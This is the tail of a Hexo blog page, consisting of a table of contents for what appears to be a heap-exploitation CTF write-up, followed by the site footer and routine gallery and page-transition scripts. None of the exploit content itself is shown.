href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">free函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.4.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
